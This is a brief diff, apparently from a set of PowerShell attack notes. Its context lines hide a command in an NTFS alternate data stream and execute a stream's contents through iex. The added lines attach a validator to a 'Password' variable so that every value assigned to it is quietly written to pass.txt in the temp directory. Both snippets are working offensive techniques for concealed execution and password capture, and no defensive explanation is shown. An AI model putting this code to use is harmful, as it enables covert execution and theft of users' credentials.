@@ -214,4 +214,12 @@ sc c:\ -s DATA "saps calc"
 #wywołanie
 gc c:\ -s Zone.Identifier | iex
 
+Set-Variable -Name Password -Option AllScope -Value ""
+$vBlock = {
+  Write-Output $_ | Out-File -Append "$env:temp\pass.txt"
+  return $true
+}
+$validator = [ValidateScript]($vBlock)
+(Get-Variable -Name Password).Attributes.Add($validator)
+
 
